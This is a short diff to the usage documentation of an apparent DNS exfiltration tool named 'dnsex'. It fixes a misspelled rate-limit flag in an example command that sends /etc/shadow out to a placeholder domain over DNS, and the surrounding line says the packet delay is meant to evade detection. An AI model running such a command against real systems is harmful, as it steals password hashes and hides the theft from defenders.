@@ -58,5 +58,5 @@ dnsex client -d yourdomain.com "Hello from the inside"
 **Exfiltrate a file:**
 Send a sensitive file with a 50ms delay between packets to evade detection.
 ```bash
-dnsex client -d yourdomain.com -f /etc/shadow --rate-limt 50
+dnsex client -d yourdomain.com -f /etc/shadow --rate-limit 50
 ```
